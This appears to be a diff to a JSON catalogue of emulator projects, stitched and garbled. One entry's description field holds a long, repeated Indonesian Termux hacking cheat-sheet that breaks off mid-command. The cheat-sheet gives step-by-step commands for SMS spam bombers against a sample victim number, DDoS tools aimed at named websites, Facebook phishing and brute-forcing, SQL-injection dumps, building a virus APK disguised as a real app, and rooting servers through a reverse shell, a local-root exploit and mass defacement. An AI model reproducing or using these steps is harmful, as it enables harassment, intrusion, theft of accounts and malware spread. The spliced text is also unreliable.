Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default ajjhj +6282399188718  Spam bom mall $ pkg install update  $ pkg install upgrade  $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (```Install``` *SpamTsel*) $ pkg install curl  $ pkg install php  $ curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $  sh LITESPAM.sh atau   bash LITESPAM.sh Masukan Nomer nya...  VBugMaker Termux -apt update && apt upgrade  -apt install git  -apt install python  Donwload file ->http://upfile.mobi/YGwg8gQLuvv  Pindah ke directory  Next  -unzip vbug.zip  -mv vbug $HOME  -cd vbug  -ls  -chmod +x vbug.py  -python2 vbug.py  #Done  Cara Root Server Di Termux Dengan Ngrok Perl/PHP BackConnecter Mass Deface. 1. Install~ Buka Termux  2. Install Ngrok Registrasi Autthokennya. (http://ngrok.com/download;http://ngrok.com/signup) $ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip $ unzip ngrok-stable-linux-arm.zip ngrok $ ./ngrok authtoken JWJDKNxxxxxxxxxx $ ./ngrok tcp port :~# Welcome : Plan Free  \"0.tcp.ngrok.io:port-ngrok ~> localhost:port\" 3. Download Perl/PHP Backconnecter  (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) dan Edit file nya, cari $ip dan $port ganti dengan (0.tcp.ngrok.io:port-ngrok) ~>Upload ke website (PERL: ON)(PHP: ON) 5. in termux command : $ nc -lnvp port 6. in backdoor shell : $ perl perl-reverse-shell.pl (atau) > http://situs.co.li/perl-reverse-shell.php (Run the script simply by browsing to the newly uploaded file in your web browser)  .----(after backconnect successfully)---  7. upload LOCALROOT $ wget https://domain.com/localroot/dirty $ chmod 777 dirty $ ./dirty New password: ndasmu (successfully rooted) 8. import TTY shell ===>jika menggunakan dirty<=== $ echo \"import pty; pty.spawn('/bin/bash')\" > /tmp/sad.py $ python /tmp/sad.py ===>jika menggunakan cowroot<=== $ python -c 'import pty;pty.spawn(\"/usr/bin/passwd\")' (https://evertpot.com/189/) .-------------------------------------------- 9. login as ROOT $ su rintoar Password: ndasmu .-------------------------------------------- 10 ./mass (https://m.youtube.com/watch?v=HPQQok40v78) .--------------------------------------------  WEEMAN [✓] apt update && apt upgrade -y apt install git -y apt install python2 -y git clone https://github.com/evait-security/weeman cd weeman chmod 777 weeman.py python2 weeman.py Ex set url http://facebook.com set action_url http://facebook.com run  ___________________________________________  Hunner framework apt update apt install python apt install git -y git clone https://github.com/b3-v3r/Hunner cd Hunner  chmod 777 hunner.py python hunner.py ___________________________________________  SQLMAP [✓]  apt update apt install python apt install python2 apt install git git clone https://github.com/sqlmapproject/sqlmap cd sqlmap Python2 sqlmap.py ______ Exemplo Python2 sqlmap.py -u website –dbs -D acuart –tables -D acuart -T users –columns -D acuart -T users -C name,email,phone -dump ___________________________________ DDOS XERXES [✓] clang xerxes.c -o xerxes ./xerxes website 80 ___________________________________  DDOS TORSHAMMER [✓] apt-get update apt-get install python2 apt-get install tor apt-get install git git clone https://github.com/dotfighter/torshammer.git cd torshammer python2 torshammer.py -T -t website  ___________________________________  BRUTEFORCE [✓] apt update apt upgrade apt install python apt install pip pip install wordlist apt install worlist Wordlist -h cd /sdcard Cat pas.txt ___________________________________  Localizar ip Apt install python git git clone https://github.com/maldevel/IPGeoLocation.git cd IPGeoLocation chmod +x ipgeoLocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t http://www.google.com ___________________________________  Hecker RECONDOG apt update apt install python python2 apt install git git clone https://github.com/UltimateHackers/ReconDog cd ReconDog chmod +x dog.py Python2 dog.py ___________________________________  BUSCA PAINEL ADM DE SITE pkg install git git clone https://github.com/Techzindia/admin_penal cd admin_penal chmod +x admin_panel_finder.py python2 admin_panel_finder.py ___________________________________  HAKKU apt install pytho apt install git mkdir vasu git clone https://github.com/4shadoww/hakkuframework cd hakkuframework chmod +x hakku python hakku show modules use whois show options set target examplesite.com run  ___________________________________________  RED HAWK apt update apt install git git clone https://github.com/Tuhinshubhra/RED_HAWK cd RED_HAWK chmod +x rhawk.php apt install php ls php rhawk.php  ___________________________________________  D-TECT apt update apt install git git clone https://github.com/shawarkhanethicalhacker/D-TECT cd D-TECT apt install python2 chmod +x d-tect.py python2 d-tect.py examplesite.com ___________________________________________  viSQL apt update apt install python2 apt install git git clone https://github.com/blackvkng/viSQL cd viSQL python2 -m pip install -r requirements.txt python2 viSQL.py python2 viSQL.py -t http://www.bible-history.com __________________  Hash Buster apt update apt upgrade apt install python2 apt install git git clone https://github.com/UltimateHackers/Hash-Buster cd Hash-Buster python2 hash.py  PERKIRAAN cuaca curl http://wttr.in/ (lokasi)   tool  Routersploit apt install git apt install python2 pip2 install requests git clone https://github.com/reverse-shell/routersploit.git cd routersploit pip install -r requirements.txt termux-fix-shebang rsf.py  Cara pake cd routersploit  ./ rsf.py use scanners/autopwn show options set target 192.168.1.1 set port 8080 set threads 10 masukkan exploitsnya set target 192.168.1.1  -check -run  tool ubuntu $ apt update $ apt install git $ apt install wget $ apt install proot $ git clone https://github.com/Neo-Oli/termux-ubu&#8230; $ cd termux-ubuntu $ chmod +x ubuntu.sh $ ./ubuntu.sh $ ./start.sh  (```Install``` *Weeman* ) $ apt update && apt upgrade -y $ apt install git -y  $ apt install python2 -y $ git clone https://github.com/evait-security/weeman $ cd weeman $ chmod 777 weeman.py $ python2 weeman.py  Contoh $ set url http://facebook.com $ set action_url http://facebook.com run (Bisa diganti phising nya, kalau Twitter ya bisa ataupun yg lain)  *Ikuti Langkah Demi Langkah*  (````Install``` *Hunner framework*) $ apt update  $ apt install python $ apt install git -y $ git clone https://github.com/b3-v3r/Hunner $ cd Hunner $ chmod 777 hunner.py $ python hunner.py  Ikuti Langkah Demi Langkah  (```Install``` *SQLMAP*)   $ apt update $ apt install python $ apt install python2 $ apt install git $ gi clone https://github.com/sqlmapproject/sqlmap $ cd sqlmap $ Python2 sqlmap.py Exemple:-  Python2 sqlmap.py -u website --dbs -D acuart --tables -D acuart -T users --columns -D acuart -T users -C name,email,phone -dump  Ikuti Langkah Demi Langkah  Lacak ip git clone https://github.com/maldevel/IPGeolocation cd IPGeolocation chmod +x ipgeolocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t IP yang ingin dilacak  bbom spam apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default ajjh  --------------------------------------------------------------------- *1.Spammer SMS Grab  Install Spammernya dulu* $pkg install python2  $pip2 install requests  $pkg install git  $git clone https://github.com/p4kl0nc4t/Spammer-Grab  $cd Spammer-Grab  $ls  $chmod +x spammer.py  $python2 spammer.py --delay 30 nomor korban.   ---------------------------------------------------------------------------------------  *Cara Install Lazymux di Termux*  $ pkg update && upgrade  $ pkg install python2  $ pkg install git  $ git clone https://github.com/Gameye98/Lazymux  $ cd Lazymux  $ chmod +x lazymux.py  $ python2 lazymux.py   ---------------------------------------------------------------------------------------  *2.Cara install tools daijobu* Fungsinya nanti liat sendiri lah di dalem tools nya  $apt upgrade && apt update  $apt install php  $apt install git  Kalo udah selesai langsung masukan git nya dengan perintah  $git clone https://github.com/alintamvanz/diejoubu  $cd diejoubu  $cd v1.2  $php diejoubu.php   ---------------------------------------------------------------------------------------   3. Install webdav   $ apt update && upgrade  $ apt install python2  $ pip2 install urllib3 chardet certifi idna requests  $ apt install openssl curl  $ pkg install libcurl  $ ln -s /sdcard  $ cd sdcard  $ mkdir webdav  $ cd webdav  $ curl -k -O https://pastebin.com/raw/HnVyQPtR  $ mv HnVyQPtR webdav.py  $ python2 webdav.py  ---------------------------------------------------------------------------------------   *2. Xerxes* $ apt install git  $ apt install clang  $ git clone https://github.com/zanyarjamal/xerxes  $ ls  $ cd xerxes  $ ls  $ clang xerxes.c -o xerxes  $ ls  $ ./xerxes (nama website) 80   ---------------------------------------------------------------------------------------  *3. Torshammer* $ pkg update  $ pkg install git  $ Pkg install tor  $ pkg install python2  $ git clone https://github.com/dotfighter/torshammer.git  $ ls  $ cd torshammer  $ python2 torshammer.py -T -t seword.com ( web y ang kalian attack ) #mr khanz'''TOOL TERMUX Cara Install D-tect tool di android termux (command ) :  $ apt install git $ apt install python2 $ git clone https://github.com/shawarkhanethicalhacker/D-TECT $ ls $ cd D-TECH $ chmod +x d-tect.py $ python2 d-tect.py  cara uninstall tool termux  rm -rf toolsnya  cara buat virus cd /sdcard cd vbug ls chmod vbug.py chmod -v vbug.py python2 vbug.py  irssi /connet irc.freenode.net /nick w3wandroid /join #modol _________________________ DDOS via Termux   1. Hammer $ pkg update (tekan enter) $ pkg upgrade (tekan enter) $ pkg install python (tekan enter) $ pkg install git (tekan enter) $ git clone https://github.com/cyweb/hammer (tekan enter) $ cd hammer (tekan enter) $ python hammer.py (tekan enter) $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.125  2. Xerxes $ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  3. Torshammer $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls  $ cd torshammer $ python2 torshammer.py  4. liteDDOS $ apt update $ apt upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/4L13199/LITEDDOS $ cd LITEDDOS $ python2 liteDDOS.py  _________________________________________ Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy  ________________________________________ musikan di termux $ pkg install mpv  $ mpv/sdcard/lagu.mp3  /sdcard/ bisa di ganti sesuai letak musik  ________________________________________ Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah  ________________________________________ Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya  _______________________________________ Menampilkan animasi kereta :v $ pkg install sl $ sl  _______________________________________ menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch  _______________________________________ menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya  _______________________________________ $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dgn mengetik nomornya.                       ￼ Tutorial membuat virus seperti aplikasi aslinya🚨 Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug https://www.mediafire.com/file/6hs6y71ryw10uvw/vbug.zip  1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh  auto boot fb git clone https://github.com/Senitopeng/BotFbBangDjon.git cd BotFbBangDjon python2 bangdjon.py melihat id fb https://findmyfbid.in/  git clone https://github.com/tomiashari/fb-autoreaction.git  cd fb-autoreaction python2 fb-autoreaction  cara membuat virus cd Vbug/vbug.py cd /storage/emulated/0/Vbug cd vbug Python2 vbug.py  CRACK PASSWORD HASH git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ cd FHX-Hash-Killer python2 FHXHashKiller.py  git clone https://github.com/UltimateHackers/Hash-Buster $ cd Hash-Buster $ python2 hash.py  pkg install irssi irssi (enter) /connect chat.freenode.net /nick oki /join #mrmaze  Cara install Metasploit di termux (No Root) ~ apt update && apt upgrade ~ apt install curl ~ curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh ~ chmod +x metasploit.sh ~ ./metasploit.sh ... Tunggu proses instalasi sekitar 30-40 menit tergantung koneksi internet ...  ( hack fb via termux ) $apt update $apt upgrade  $apt install python2 $apt install python2-dev $apt install wget $dip2 install mechanize $cd/sterage/emulated/0 $python2 fbbrute.py ( yg tdi di download  di tunda di luar folder ) $storage/emulated/0/fassword.txt ( sama kya yang tadi di download trus tinda di luar folder ) =tinggal tunggu fassword nya muncul  Jika beruntung *silahkan mencoba*  tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools  pip install mps_youtube pip install youtube_dl apt install mpv mpsyt /judul  $ pkg update && pkg upgrade CHATTING VIA TERMUX $ pkg install irssi $ irssi $ /connect chat.freenode.net $ /nick 1235 12345 di ganti sesuai nama/nick agan $ /join #XCAteam  100% work boom spam apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default ajjhj +6282399188718  Spam bom mall $ pkg install update  $ pkg install upgrade  $ pkg install wget $ pkg install php $ wget http://files-store.theprivat.ml/uploads/bom-mall.zip $ unzip bom-mall.zip $ cd bom-mall $ php run.php  (```Install``` *SpamTsel*) $ pkg install curl  $ pkg install php  $ curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php  $ chmod 777 bombtsel.php $ php bombtsel.php 3) Tool Spam LITESPAM $ pkg install php $ pkg install toilet $ pkg install sh $ pkg install git $ git clone https://github.com/4L13199/LITESPAM $ cd LITESPAM $  sh LITESPAM.sh atau   bash LITESPAM.sh Masukan Nomer nya...  VBugMaker Termux -apt update && apt upgrade  -apt install git  -apt install python  Donwload file ->http://upfile.mobi/YGwg8gQLuvv  Pindah ke directory  Next  -unzip vbug.zip  -mv vbug $HOME  -cd vbug  -ls  -chmod +x vbug.py  -python2 vbug.py  #Done  Cara Root Server Di Termux Dengan Ngrok Perl/PHP BackConnecter Mass Deface. 1. Install~ Buka Termux  2. Install Ngrok Registrasi Autthokennya. (http://ngrok.com/download;http://ngrok.com/signup) $ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip $ unzip ngrok-stable-linux-arm.zip ngrok $ ./ngrok authtoken JWJDKNxxxxxxxxxx $ ./ngrok tcp port :~# Welcome : Plan Free  \"0.tcp.ngrok.io:port-ngrok ~> localhost:port\" 3. Download Perl/PHP Backconnecter  (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) dan Edit file nya, cari $ip dan $port ganti dengan (0.tcp.ngrok.io:port-ngrok) ~>Upload ke website (PERL: ON)(PHP: ON) 5. in termux command : $ nc -lnvp port 6. in backdoor shell : $ perl perl-reverse-shell.pl (atau) > http://situs.co.li/perl-reverse-shell.php (Run the script simply by browsing to the newly uploaded file in your web browser)  .----(after backconnect successfully)---  7. upload LOCALROOT $ wget https://domain.com/localroot/dirty $ chmod 777 dirty $ ./dirty New password: ndasmu (successfully rooted) 8. import TTY shell ===>jika menggunakan dirty<=== $ echo \"import pty; pty.spawn('/bin/bash')\" > /tmp/sad.py $ python /tmp/sad.py ===>jika menggunakan cowroot<=== $ python -c 'import pty;pty.spawn(\"/usr/bin/passwd\")' (https://evertpot.com/189/) .-------------------------------------------- 9. login as ROOT $ su rintoar Password: ndasmu .-------------------------------------------- 10 ./mass (https://m.youtube.com/watch?v=HPQQok40v78) .--------------------------------------------  WEEMAN [✓] apt update && apt upgrade -y apt install git -y apt install python2 -y git clone https://github.com/evait-security/weeman cd weeman chmod 777 weeman.py python2 weeman.py Ex set url http://facebook.com set action_url http://facebook.com run  ___________________________________________  Hunner framework apt update apt install python apt install git -y git clone https://github.com/b3-v3r/Hunner cd Hunner  chmod 777 hunner.py python hunner.py ___________________________________________  SQLMAP [✓]  apt update apt install python apt install python2 apt install git git clone https://github.com/sqlmapproject/sqlmap cd sqlmap Python2 sqlmap.py ______ Exemplo Python2 sqlmap.py -u website –dbs -D acuart –tables -D acuart -T users –columns -D acuart -T users -C name,email,phone -dump ___________________________________ DDOS XERXES [✓] clang xerxes.c -o xerxes ./xerxes website 80 ___________________________________  DDOS TORSHAMMER [✓] apt-get update apt-get install python2 apt-get install tor apt-get install git git clone https://github.com/dotfighter/torshammer.git cd torshammer python2 torshammer.py -T -t website  ___________________________________  BRUTEFORCE [✓] apt update apt upgrade apt install python apt install pip pip install wordlist apt install worlist Wordlist -h cd /sdcard Cat pas.txt ___________________________________  Localizar ip Apt install python git git clone https://github.com/maldevel/IPGeoLocation.git cd IPGeoLocation chmod +x ipgeoLocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t http://www.google.com ___________________________________  Hecker RECONDOG apt update apt install python python2 apt install git git clone https://github.com/UltimateHackers/ReconDog cd ReconDog chmod +x dog.py Python2 dog.py ___________________________________  BUSCA PAINEL ADM DE SITE pkg install git git clone https://github.com/Techzindia/admin_penal cd admin_penal chmod +x admin_panel_finder.py python2 admin_panel_finder.py ___________________________________  HAKKU apt install pytho apt install git mkdir vasu git clone https://github.com/4shadoww/hakkuframework cd hakkuframework chmod +x hakku python hakku show modules use whois show options set target examplesite.com run  ___________________________________________  RED HAWK apt update apt install git git clone https://github.com/Tuhinshubhra/RED_HAWK cd RED_HAWK chmod +x rhawk.php apt install php ls php rhawk.php  ___________________________________________  D-TECT apt update apt install git git clone https://github.com/shawarkhanethicalhacker/D-TECT cd D-TECT apt install python2 chmod +x d-tect.py python2 d-tect.py examplesite.com ___________________________________________  viSQL apt update apt install python2 apt install git git clone https://github.com/blackvkng/viSQL cd viSQL python2 -m pip install -r requirements.txt python2 viSQL.py python2 viSQL.py -t http://www.bible-history.com __________________  Hash Buster apt update apt upgrade apt install python2 apt install git git clone https://github.com/UltimateHackers/Hash-Buster cd Hash-Buster python2 hash.py  PERKIRAAN cuaca curl http://wttr.in/ (lokasi)   tool  Routersploit apt install git apt install python2 pip2 install requests git clone https://github.com/reverse-shell/routersploit.git cd routersploit pip install -r requirements.txt termux-fix-shebang rsf.py  Cara pake cd routersploit  ./ rsf.py use scanners/autopwn show options set target 192.168.1.1 set port 8080 set threads 10 masukkan exploitsnya set target 192.168.1.1  -check -run  tool ubuntu $ apt update $ apt install git $ apt install wget $ apt install proot $ git clone https://github.com/Neo-Oli/termux-ubu&#8230; $ cd termux-ubuntu $ chmod +x ubuntu.sh $ ./ubuntu.sh $ ./start.sh  (```Install``` *Weeman* ) $ apt update && apt upgrade -y $ apt install git -y  $ apt install python2 -y $ git clone https://github.com/evait-security/weeman $ cd weeman $ chmod 777 weeman.py $ python2 weeman.py  Contoh $ set url http://facebook.com $ set action_url http://facebook.com run (Bisa diganti phising nya, kalau Twitter ya bisa ataupun yg lain)  *Ikuti Langkah Demi Langkah*  (````Install``` *Hunner framework*) $ apt update  $ apt install python $ apt install git -y $ git clone https://github.com/b3-v3r/Hunner $ cd Hunner $ chmod 777 hunner.py $ python hunner.py  Ikuti Langkah Demi Langkah  (```Install``` *SQLMAP*)   $ apt update $ apt install python $ apt install python2 $ apt install git $ gi clone https://github.com/sqlmapproject/sqlmap $ cd sqlmap $ Python2 sqlmap.py Exemple:-  Python2 sqlmap.py -u website --dbs -D acuart --tables -D acuart -T users --columns -D acuart -T users -C name,email,phone -dump  Ikuti Langkah Demi Langkah  Lacak ip git clone https://github.com/maldevel/IPGeolocation cd IPGeolocation chmod +x ipgeolocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t IP yang ingin dilacak  bbom spam apt upgrade && apt update apt install git  git clone https://github.com/Amriez/gcospam cd gcospam sh install.sh sh gco.sh Pilih nomer yang mana ajjh  Lalu Masukan nomer tanpa 0/62 Input bebas Jeda default ajjh  --------------------------------------------------------------------- *1.Spammer SMS Grab  Install Spammernya dulu* $pkg install python2  $pip2 install requests  $pkg install git  $git clone https://github.com/p4kl0nc4t/Spammer-Grab  $cd Spammer-Grab  $ls  $chmod +x spammer.py  $python2 spammer.py --delay 30 nomor korban.   ---------------------------------------------------------------------------------------  *Cara Install Lazymux di Termux*  $ pkg update && upgrade  $ pkg install python2  $ pkg install git  $ git clone https://github.com/Gameye98/Lazymux  $ cd Lazymux  $ chmod +x lazymux.py  $ python2 lazymux.py   ---------------------------------------------------------------------------------------  *2.Cara install tools daijobu* Fungsinya nanti liat sendiri lah di dalem tools nya  $apt upgrade && apt update  $apt install php  $apt install git  Kalo udah selesai langsung masukan git nya dengan perintah  $git clone https://github.com/alintamvanz/diejoubu  $cd diejoubu  $cd v1.2  $php diejoubu.php   ---------------------------------------------------------------------------------------   3. Install webdav   $ apt update && upgrade  $ apt install python2  $ pip2 install urllib3 chardet certifi idna requests  $ apt install openssl curl  $ pkg install libcurl  $ ln -s /sdcard  $ cd sdcard  $ mkdir webdav  $ cd webdav  $ curl -k -O https://pastebin.com/raw/HnVyQPtR  $ mv HnVyQPtR webdav.py  $ python2 webdav.py  ---------------------------------------------------------------------------------------   *2. Xerxes* $ apt install git  $ apt install clang  $ git clone https://github.com/zanyarjamal/xerxes  $ ls  $ cd xerxes  $ ls  $ clang xerxes.c -o xerxes  $ ls  $ ./xerxes (nama website) 80   ---------------------------------------------------------------------------------------  *3. Torshammer* $ pkg update  $ pkg install git  $ Pkg install tor  $ pkg install python2  $ git clone https://github.com/dotfighter/torshammer.git  $ ls  $ cd torshammer  $ python2 torshammer.py -T -t [8/11 18.11] BOT X3NONOLIMIT: Hack FACEBOOK   *apt update && apt upgrade *pkg install python2 && pkg install wget *pip2 install mechanize && pip2 install request *pkg install git *git clone https://github.com/tikuskecil/multi-bruteforce-facebook *cd multi-bruteforce-facebook *ls  *python2 MBF.py"
+  },
+  {
+    "name": "cv_emulate",
+    "slug": "cv-emulate",
+    "creator": "hongtaoh",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/hongtaoh/cv_emulate",
+    "cover": "https://avatars.githubusercontent.com/u/62803332?v=4",
+    "description": "Academic CVs that you can emulate"
+  },
+  {
+    "name": "cosmic-term",
+    "slug": "cosmic-term",
+    "creator": "pop-os",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/pop-os/cosmic-term",
+    "cover": "https://avatars.githubusercontent.com/u/33131755?v=4",
+    "description": "COSMIC terminal emulator"
+  },
+  {
+    "name": "nestur",
+    "slug": "nestur",
+    "creator": "spieglt",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/spieglt/nestur",
+    "cover": "https://avatars.githubusercontent.com/u/22626146?v=4",
+    "description": "The NES (emulator) you left outside in the rain but let dry and still kind of works"
+  },
+  {
+    "name": "pubg_mobile_memory_hacking_examples",
+    "slug": "pubg-mobile-memory-hacking-examples",
+    "creator": "atiksoftware",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/atiksoftware/pubg_mobile_memory_hacking_examples",
+    "cover": "https://avatars.githubusercontent.com/u/14994715?v=4",
+    "description": "Pubg Mobile Emulator Gameloop Memory Hacking C++ code examples. Ex: Name, Coord, Bones, Weapons, Items, Box, Drop etc."
+  },
+  {
+    "name": "rv32emu",
+    "slug": "rv32emu",
+    "creator": "sysprog21",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/sysprog21/rv32emu",
+    "cover": "https://avatars.githubusercontent.com/u/22310129?v=4",
+    "description": "Compact and Efficient RISC-V RV32I[MAFC] emulator"
+  },
+  {
+    "name": "aps3e",
+    "slug": "aps3e",
+    "creator": "aenu1",
+    "version": "...",
+    "console": "PlayStation 3",
+    "url": "https://github.com/aenu1/aps3e",
+    "cover": "https://avatars.githubusercontent.com/u/209302141?v=4",
+    "description": "An experimental Android PS3 emulator, ported and optimized based on RPCS3. "
+  },
+  {
+    "name": "dockerify-android",
+    "slug": "dockerify-android",
+    "creator": "Shmayro",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/Shmayro/dockerify-android",
+    "cover": "https://avatars.githubusercontent.com/u/6267648?v=4",
+    "description": "A Dockerized Android emulator supporting multiple CPU architectures (x86 and arm64) with native performance and seamless ADB & Scrcpy Web access."
+  },
+  {
+    "name": "uefiseven",
+    "slug": "uefiseven",
+    "creator": "manatails",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/manatails/uefiseven",
+    "cover": "https://avatars.githubusercontent.com/u/4215028?v=4",
+    "description": "An EFI loader that emulates int10h interrupts needed for booting Windows 7 under UEFI Class 3 systems."
+  },
+  {
+    "name": "game-patches",
+    "slug": "game-patches",
+    "creator": "xenia-canary",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/xenia-canary/game-patches",
+    "cover": "https://avatars.githubusercontent.com/u/53588623?v=4",
+    "description": "Game patches for the Xenia emulator"
+  },
+  {
+    "name": "awesome-n64-development",
+    "slug": "awesome-n64-development",
+    "creator": "command-tab",
+    "version": "...",
+    "console": "Nintendo 64",
+    "url": "https://github.com/command-tab/awesome-n64-development",
+    "cover": "https://avatars.githubusercontent.com/u/3069?v=4",
+    "description": "A curated list of Nintendo 64 development resources including toolchains, documentation, emulators, example code, and more"
+  },
+  {
+    "name": "Cinoop",
+    "slug": "cinoop",
+    "creator": "CTurt",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/CTurt/Cinoop",
+    "cover": "https://avatars.githubusercontent.com/u/6132330?v=4",
+    "description": "Multiplatform Game Boy emulator"
+  },
+  {
+    "name": "MCUME",
+    "slug": "mcume",
+    "creator": "Jean-MarcHarvengt",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Jean-MarcHarvengt/MCUME",
+    "cover": "https://avatars.githubusercontent.com/u/39926416?v=4",
+    "description": "Multi CompUter Machine Emulator for several MCUs"
+  },
+  {
+    "name": "kitty-themes",
+    "slug": "kitty-themes",
+    "creator": "kovidgoyal",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/kovidgoyal/kitty-themes",
+    "cover": "https://avatars.githubusercontent.com/u/1308621?v=4",
+    "description": "Themes for the kitty terminal emulator"
+  },
+  {
+    "name": "FEMU",
+    "slug": "femu",
+    "creator": "MoatLab",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/MoatLab/FEMU",
+    "cover": "https://avatars.githubusercontent.com/u/109181208?v=4",
+    "description": "FEMU: Accurate, Scalable and Extensible NVMe SSD Emulator (FAST'18)"
+  },
+  {
+    "name": "openMSX",
+    "slug": "openmsx",
+    "creator": "openMSX",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/openMSX/openMSX",
+    "cover": "https://avatars.githubusercontent.com/u/12670808?v=4",
+    "description": "the MSX emulator that aims for perfection"
+  },
+  {
+    "name": "fauxmo",
+    "slug": "fauxmo",
+    "creator": "makermusings",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/makermusings/fauxmo",
+    "cover": "https://avatars.githubusercontent.com/u/13390276?v=4",
+    "description": "Emulated Belkin WeMo devices that work with the Amazon Echo"
+  },
+  {
+    "name": "snow",
+    "slug": "snow",
+    "creator": "twvd",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/twvd/snow",
+    "cover": "https://avatars.githubusercontent.com/u/11619441?v=4",
+    "description": "Classic Macintosh emulator"
+  },
+  {
+    "name": "mininet-wifi",
+    "slug": "mininet-wifi",
+    "creator": "intrig-unicamp",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/intrig-unicamp/mininet-wifi",
+    "cover": "https://avatars.githubusercontent.com/u/8920446?v=4",
+    "description": "Emulator for Software-Defined Wireless Networks"
+  },
+  {
+    "name": "tiny386",
+    "slug": "tiny386",
+    "creator": "hchunhui",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/hchunhui/tiny386",
+    "cover": "https://avatars.githubusercontent.com/u/975501?v=4",
+    "description": "tiny 386 PC emulator; running win9x on esp32"
+  },
+  {
+    "name": "VerilogBoy",
+    "slug": "verilogboy",
+    "creator": "zephray",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/zephray/VerilogBoy",
+    "cover": "https://avatars.githubusercontent.com/u/5101637?v=4",
+    "description": "A Pi emulating a GameBoy sounds cheap. What about an FPGA?"
+  },
+  {
+    "name": "DobieStation",
+    "slug": "dobiestation",
+    "creator": "PSI-Rockin",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/PSI-Rockin/DobieStation",
+    "cover": "https://avatars.githubusercontent.com/u/12768103?v=4",
+    "description": "A dog-themed PS2 emulator"
+  },
+  {
+    "name": "iNDS",
+    "slug": "inds",
+    "creator": "iNDS-Team",
+    "version": "...",
+    "console": "Nintendo DS",
+    "url": "https://github.com/iNDS-Team/iNDS",
+    "cover": "https://avatars.githubusercontent.com/u/39138523?v=4",
+    "description": "Revival of the Nintendo DS emulator for iOS"
+  },
+  {
+    "name": "mednaffe",
+    "slug": "mednaffe",
+    "creator": "AmatCoder",
+    "version": "...",
+    "console": "Multi Platform",
